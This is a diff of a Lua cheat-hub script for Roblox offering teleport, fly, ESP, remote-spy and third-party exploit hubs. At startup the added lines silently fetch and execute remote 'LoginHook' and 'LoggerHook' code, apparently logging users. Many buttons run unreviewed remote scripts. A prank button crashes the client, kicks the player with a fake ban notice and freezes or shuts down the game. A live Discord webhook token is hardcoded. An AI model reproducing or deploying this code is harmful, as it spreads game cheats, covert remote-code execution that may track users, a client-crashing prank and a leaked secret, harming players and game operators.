@@ -1,4 +1,5 @@
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/DiscordWeb.lua"))()
+-- Services
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/KuroLoginHook.lua"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -7,8 +8,10 @@ local TeleportService = game:GetService("TeleportService")
 local ProximityPromptService = game:GetService("ProximityPromptService")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local KuroNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/KuroWebhook.lua"))()
+local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
+local KuroNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/KuroLoggerHook.lua"))()
 
+-- Variables
 local GrowGame = 126884695634066
 local LocalPlayer = Players.LocalPlayer
 local jumpEnabled = false
@@ -19,9 +22,11 @@ local instantInteractEnabled = false
 local disablePromptConnection
 local Notif = KuroNotif.new()
 
+-- Auto execute
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 playerGui.ScreenOrientation = Enum.ScreenOrientation.LandscapeSensor
 
+--Random Messages 😏
 local messages = {
     "Want some milk?😝",
     "Daiski😏🤭",
@@ -31,6 +36,7 @@ local messages = {
 }
 
 local RM = messages[math.random(#messages)]
+
 local hour = tonumber(os.date("%H"))
 local GT = ""
 if hour >= 6 and hour < 12 then
@@ -41,8 +47,10 @@ else
     GT = "Good evening Darling dont stay up too late 😤"
 end
 
+-- Load Rayfield
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+-- Create Rayfield Window
 local Window = Rayfield:CreateWindow({
     Name = GT,
     Icon = 0,
@@ -62,12 +70,21 @@ local Window = Rayfield:CreateWindow({
     KeySystem = false
 })
 
+--[[StarterGui:SetCore("SendNotification", {
+    Title = "MASTER " .. LocalPlayer.DisplayName,
+    Text = "📸📸📸",
+    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=180&h=180",
+    Duration = 5
+})]]
+
+-- Status Tab
 local StatusTab = Window:CreateTab("Status", nil)
 local LocalTimeLabel = StatusTab:CreateLabel("Current Time: --:--:--")
 local UTCTimeLabel = StatusTab:CreateLabel("UTC Time: --:--:--")
 local PlayerCountLabel = StatusTab:CreateLabel("Players: --")
 local StatusPosLabel = StatusTab:CreateLabel("Position: --, --, --")
 
+-- Update Time (using task.spawn and task.wait)
 task.spawn(function()
     while task.wait(0.5) do
         local localTime = os.date("%I:%M:%S %p")
@@ -77,6 +94,7 @@ task.spawn(function()
     end
 end)
 
+-- Update Player Count
 local function updatePlayerCount()
     PlayerCountLabel:Set("Players in server: " .. #Players:GetPlayers())
 end
@@ -85,10 +103,12 @@ Players.PlayerAdded:Connect(updatePlayerCount)
 Players.PlayerRemoving:Connect(updatePlayerCount)
 updatePlayerCount()
 
+-- Player Tab
 local PlayerTab = Window:CreateTab("Player", nil)
 local PlayerPosLabel = PlayerTab:CreateLabel("Position: --, --, --")
 local StatusLabel = PlayerTab:CreateLabel("No position saved yet.")
 
+-- Update Player Position (using task.spawn and task.wait, with checks)
 task.spawn(function()
     while task.wait(0.1) do
         local character = LocalPlayer.Character
@@ -102,6 +122,7 @@ task.spawn(function()
     end
 end)
 
+-- Save Position
 PlayerTab:CreateButton({
     Name = "Set Position",
     Callback = function()
@@ -116,6 +137,7 @@ PlayerTab:CreateButton({
     end,
 })
 
+-- Teleport to Saved Position
 PlayerTab:CreateButton({
     Name = "Teleport to Saved Position",
     Callback = function()
@@ -236,6 +258,7 @@ LocalPlayer.CharacterAdded:Connect(function()
     end
 end)
 
+-- Jump Override Toggle
 PlayerTab:CreateToggle({
     Name = "Enable Jump Override",
     CurrentValue = false,
@@ -260,7 +283,7 @@ end)
 PlayerTab:CreateButton({
     Name = "🕊️Fly gui",
     Callback = function()
-        Notif:SendNotif("Fly Gui")
+        Notif:sendnotif("Fly Gui")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/fly%20gui.lua"))()
     end,
 })
@@ -268,7 +291,7 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "Jork",
     Callback = function()
-        Notif:SendNotif("Jork")
+        Notif:sendnotif("Jork")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Jork.lua"))()
     end,
 })
@@ -276,10 +299,10 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "reset",
     Callback = function()
-        Notif:SendNotif("Reset")
+        Notif:sendnotif("Reset")
         local function CallDie(D)
             if D == "Yes" then
-                Notif:SendNotif("Picked Yes on Reset")
+                Notif:sendnotif("Picked Yes on Reset")
                 local character = LocalPlayer.Character
                 local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                 if humanoid then
@@ -307,7 +330,7 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "Cam Noclip",
     Callback = function()
-        Notif:SendNotif("Cam Noclip")
+        Notif:sendnotif("Cam Noclip")
         Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
     end,
 })
@@ -315,14 +338,14 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "Cam Clip",
     Callback = function()
-        Notif:SendNotif("Cam Clip")
+        Notif:sendnotif("Cam Clip")
         Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
     end,
 })
 PlayerTab:CreateButton({
     Name = "First Person🧑",
     Callback = function()
-        Notif:SendNotif("First Person")
+        Notif:sendnotif("First Person")
         LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     end,
 })
@@ -330,7 +353,7 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "Normal Zoom",
     Callback = function()
-        Notif:SendNotif("Normal Zoom")
+        Notif:sendnotif("Normal Zoom")
         LocalPlayer.CameraMaxZoomDistance = 128
         LocalPlayer.CameraMode = Enum.CameraMode.Classic
     end,
@@ -345,8 +368,10 @@ PlayerTab:CreateButton({
     end,
 })
 
-local UtilityTab = Window:CreateTab("Utility", nil)
+-- Utility Tab (Renamed from 'utility' to avoid nil error)
+local UtilityTab = Window:CreateTab("Utility", nil) -- Correctly define UtilityTab
 
+-- Function to get players by name or display name
 local function getPlr(name)
     local foundPlayers = {}
     local searchNameLower = string.lower(name)
@@ -362,6 +387,7 @@ local function getPlr(name)
     return foundPlayers
 end
 
+-- Goto Functionality
 UtilityTab:CreateInput({
     Name = "Goto",
     CurrentValue = "",
@@ -382,8 +408,10 @@ UtilityTab:CreateInput({
         local targetPlayer = targetPlayers[1]
         local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
         local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
+
         local myCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
         local myRoot = myCharacter:FindFirstChild("HumanoidRootPart")
+
         if targetRoot and myRoot then
             myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 5, 0)
             StarterGui:SetCore("SendNotification", {
@@ -421,7 +449,7 @@ UtilityTab:CreateInput({
 UtilityTab:CreateButton({
     Name = "Esp on",
     Callback = function()
-        Notif:SendNotif("Esp On")
+        Notif:sendnotif("Esp On")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Esp.lua"))()
     end,
 })
@@ -429,10 +457,25 @@ UtilityTab:CreateButton({
 UtilityTab:CreateButton({
     Name = "Esp off",
     Callback = function()
-        Notif:SendNotif("Esp Off")
+        Notif:sendnotif("Esp Off")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Remove.lua"))()
     end,
 })
+
+--[[ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
+    if instantInteractEnabled then
+        fireproximityprompt(prompt)
+    end
+end)
+
+UtilityTab:CreateToggle({
+    Name = "Instant Interact",
+    CurrentValue = false,
+    Flag = "Interact",
+    Callback = function(Value)
+        instantInteractEnabled = Value
+    end,
+})]]
 
 local function disablePrompts()
     for _, obj in ipairs(game:GetDescendants()) do
@@ -440,7 +483,8 @@ local function disablePrompts()
             obj.Enabled = false
         end
     end
-    disablePromptConnection = game.DescendantAdded:Connect(function(child)
+
+disablePromptConnection = game.DescendantAdded:Connect(function(child)
         if child:IsA("ProximityPrompt") then
             child.Enabled = false
         end
@@ -453,6 +497,7 @@ local function enablePrompts()
             obj.Enabled = true
         end
     end
+
     if disablePromptConnection then
         disablePromptConnection:Disconnect()
         disablePromptConnection = nil
@@ -485,10 +530,78 @@ UtilityTab:CreateSlider({
     end,
 })
 
+--[[UtilityTab:CreateButton({
+    Name = "Rejoin",
+    Callback = function()
+        local function Rj(R)
+            if R == "Yes" then
+                task.wait(0.5)
+                if LocalPlayer then
+                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                end
+            elseif R == "No" then
+            end
+        end
+
+        local rejoin = Instance.new("BindableFunction")
+        rejoin.OnInvoke = Rj
+
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Rejoin?",
+            Text = "⚠️",
+            Duration = 5,
+            Button1 = "Yes",
+            Button2 = "No",
+            Callback = rejoin,
+        })
+    end,
+})
+
+UtilityTab:CreateButton({
+    Name = "Server hop",
+    Callback = function()
+        local function Shop(Hop)
+            if Hop == "Yes" then
+                task.wait(0.5)
+             local Http = game:GetService("HttpService")
+local TPS = game:GetService("TeleportService")
+local Api = "https://games.roblox.com/v1/games/"
+local _place = game.PlaceId
+local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+function ListServers(cursor)
+  local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+  return Http:JSONDecode(Raw)
+end
+
+local Server, Next; repeat
+  local Servers = ListServers(Next)
+  Server = Servers.data[1]
+  Next = Servers.nextPageCursor
+until Server
+
+TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
+            elseif Hop == "No" then
+            end
+        end
+
+        local SHop = Instance.new("BindableFunction")
+        SHop.OnInvoke = Shop
+
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Server hop",
+            Text = "⚠️",
+            Duration = 5,
+            Button1 = "Yes",
+            Button2 = "No",
+            Callback = SHop,
+        })
+    end,
+})]]
+
 UtilityTab:CreateButton({
     Name = "Leave",
     Callback = function()
-        Notif:SendNotif("Leave")
+        Notif:sendnotif("Leave")
         local function Shut(L)
             if L == "Yes" then
                 task.wait(1.5)
@@ -496,8 +609,10 @@ UtilityTab:CreateButton({
             elseif L == "No" then
             end
         end
+
         local Down = Instance.new("BindableFunction")
         Down.OnInvoke = Shut
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "Leave?",
             Text = "⚠️",
@@ -511,12 +626,15 @@ UtilityTab:CreateButton({
 
 if game.PlaceId == GrowGame then
     local GrowTab = Window:CreateTab("Grow a Garden (W.I.P)", nil)
+    
     GrowTab:CreateButton({
         Name = "Gear Ui",
         Callback = function()
-            Notif:SendNotif("Gear Ui")
+            Notif:sendnotif("Gear Ui")
             _G.toggleGear = _G.toggleGear or false
+
             local shop = playerGui.Gear_Shop
+
             if _G.toggleGear then
                 shop.Enabled = false
                 shop.IgnoreGuiInset = false
@@ -528,12 +646,15 @@ if game.PlaceId == GrowGame then
             end
         end,
     })
+
     GrowTab:CreateButton({
         Name = "Seed Ui",
         Callback = function()
-            Notif:SendNotif("Seed Ui")
+            Notif:sendnotif("Seed Ui")
             _G.toggleSeed = _G.toggleSeed or false
+
             local shop = playerGui.Seed_Shop
+
             if _G.toggleSeed then
                 shop.Enabled = false
                 shop.IgnoreGuiInset = false
@@ -545,12 +666,15 @@ if game.PlaceId == GrowGame then
             end
         end,
     })
+
     GrowTab:CreateButton({
         Name = "Cosmetic Ui",
         Callback = function()
-            Notif:SendNotif("Cosmetic Ui")
+            Notif:sendnotif("Cosmetic Ui")
             _G.toggleCosmetic = _G.toggleCosmetic or false
+
             local shop = playerGui.CosmeticShop_UI
+
             if _G.toggleCosmetic then
                 shop.Enabled = false
                 shop.IgnoreGuiInset = false
@@ -565,18 +689,21 @@ if game.PlaceId == GrowGame then
 end
 
 local Scripts = Window:CreateTab("Scripts", nil)
+
 Scripts:CreateButton({
     Name = "Nameless Admin",
     Callback = function()
-        Notif:SendNotif("Nameless Admin")
+        Notif:sendnotif("Nameless Admin")
         local function CallNa(NA)
             if NA == "Yes" then
-                loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"))()
             elseif NA == "No" then
             end
         end
+
         local SayNa = Instance.new("BindableFunction")
         SayNa.OnInvoke = CallNa
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "EXECUTE",
             Text = "Nameless-Admin?",
@@ -587,18 +714,21 @@ Scripts:CreateButton({
         })
     end,
 })
+
 Scripts:CreateButton({
     Name = "Native",
     Callback = function()
-        Notif:SendNotif("Native loader")
+        Notif:sendnotif("Native loader")
         local function CallNate(Nate)
             if Nate == "Yes" then
                 (loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()  
             elseif Nate == "No" then
             end
         end
+
         local SayNate = Instance.new("BindableFunction")
         SayNate.OnInvoke = CallNate
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "EXECUTE",
             Text = "Native?",
@@ -609,18 +739,21 @@ Scripts:CreateButton({
         })
     end,
 })
+
 Scripts:CreateButton({
     Name = "No-lag",
     Callback = function()
-        Notif:SendNotif("No-Lag")
+        Notif:sendnotif("No-Lag")
         local function CallLag(Lag)
             if Lag == "Yes" then
                 loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-NoLag-Hub-no-key-38699"))()  
             elseif Lag == "No" then
             end
         end
+
         local SayLag = Instance.new("BindableFunction")
         SayLag.OnInvoke = CallLag
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "EXECUTE",
             Text = "No-lag?",
@@ -631,18 +764,21 @@ Scripts:CreateButton({
         })
     end,
 })
+
 Scripts:CreateButton({
     Name = "SpeedX",
     Callback = function()
-        Notif:SendNotif("SpeedX hub")
+        Notif:sendnotif("SpeedX hub")
         local function CallSpeed(Speed)
             if Speed == "Yes" then
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
             elseif Speed == "No" then
             end
         end
+
         local SaySpeed = Instance.new("BindableFunction")
         SaySpeed.OnInvoke = CallSpeed
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "EXECUTE",
             Text = "SpeedX?",
@@ -654,53 +790,68 @@ Scripts:CreateButton({
     end,
 })
 
+--GUI Tab
 local GuiTab = Window:CreateTab("Gui", nil)
+
 GuiTab:CreateButton({
     Name = "⌨️keyboard",
     Callback = function()
-        Notif:SendNotif("keyboard")
+        Notif:sendnotif("keyboard")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Keyboard.lua"))()
     end,
 })
+
 GuiTab:CreateButton({
     Name = "📒Notepad",
     Callback = function()
-        Notif:SendNotif("Notepad")
+        Notif:sendnotif("Notepad")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/notepad.lua"))()
     end,
 })
+
 GuiTab:CreateButton({
     Name = "Universal Viewer",
     Callback = function()
-        Notif:SendNotif("Universal Viewer")
+        Notif:sendnotif("Universal Viewer")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Universe%20Viewer.lua"))()
     end,
 })
+
 GuiTab:CreateButton({
     Name = "👀Simple Spy",
     Callback = function()
-        Notif:SendNotif("Simple Spy")
+        Notif:sendnotif("Simple Spy")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/SimpleSpy.lua"))()
     end,
 })
+
 GuiTab:CreateButton({
     Name = "🗂️Dex v3",
     Callback = function()
-        Notif:SendNotif("Dex v3")
+        Notif:sendnotif("Dex v3")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/DexMobile.lua"))()
     end,
 })
+
 GuiTab:CreateButton({
     Name = "🔒ShiftLock",
     Callback = function()
-        Notif:SendNotif("ShiftLock")
+        Notif:sendnotif("ShiftLock")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/ShiftLock.lua"))()
     end,
 })
+
+--[[GuiTab:CreateButton({
+    Name = "Executor",
+    Callback = function()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/executor.lua"))()
+    end,
+})]]
+
 GuiTab:CreateButton({
     Name = "⚠️SICRET SCREPT⚠️",
     Callback = function()
-        Notif:SendNotif("⚠️SICRET⚠️")
+        Notif:sendnotif("⚠️SICRET⚠️")
         local function Lol(Secret)
             if Secret == "YUH UH" then
                 for i = 5, 1, -1 do
@@ -711,6 +862,7 @@ GuiTab:CreateButton({
                     })
                     task.wait(1)
                 end
+
                 StarterGui:SetCore("SendNotification", {
                     Title = "It's a prank",
                     Text = "Nothing happened, but why did you pick YUH UH?🤨",
@@ -720,6 +872,7 @@ GuiTab:CreateButton({
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/Crashed.lua"))()
                 task.wait(1)
                 game.Players.LocalPlayer:Kick("Perm ban (Reason: Hacking)")
+
                 task.wait(1.5)
                 while true do end
             elseif Secret == "NAH UH" then
@@ -729,8 +882,10 @@ GuiTab:CreateButton({
                 game:Shutdown()
             end
         end
+
         local Dumb = Instance.new("BindableFunction")
         Dumb.OnInvoke = Lol
+
         game.StarterGui:SetCore("SendNotification", {
             Title = "DUDE WHY DID YOU CLICK IT?🤨📸📸",
             Text = "⚠️still wanna continue?⚠️",
@@ -743,6 +898,7 @@ GuiTab:CreateButton({
 })
 
 local Message = Window:CreateTab("Send a message", nil)
+
 local webhookMessage = ""
 local cooldownTime = 5
 local isOnCooldown = false
@@ -764,9 +920,12 @@ local send = Message:CreateButton({
         if isOnCooldown then
             return
         end
+
         isOnCooldown = true
+
         local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
         local gameName = productInfo.Name
+
         local timeNow = os.time()
         local timeFormatted = os.date("!*t", timeNow)
         local timestamp = string.format(
@@ -778,7 +937,9 @@ local send = Message:CreateButton({
             timeFormatted.min,
             timeFormatted.sec
         )
+
         local content = ""
+
         local embed = {
             title = LocalPlayer.DisplayName .. " said " .. webhookMessage,
             color = 11546102,
@@ -794,7 +955,9 @@ local send = Message:CreateButton({
             },
             timestamp = timestamp
         }
+
         local webhookUrl = "https://discord.com/api/webhooks/1381312522858270720/BwYnfcLuMi0rsW5xrgHbEzAZ0oEcyMUZ7YWKdGk5j_prrK5Foxz2TTQrxQeAnkeku9oZ"
+
         local requestFunc = http_request
         requestFunc {
             Url = webhookUrl,
@@ -807,6 +970,7 @@ local send = Message:CreateButton({
                 embeds = { embed }
             })
         }
+        
         delay(cooldownTime, function()
             isOnCooldown = false
         end)
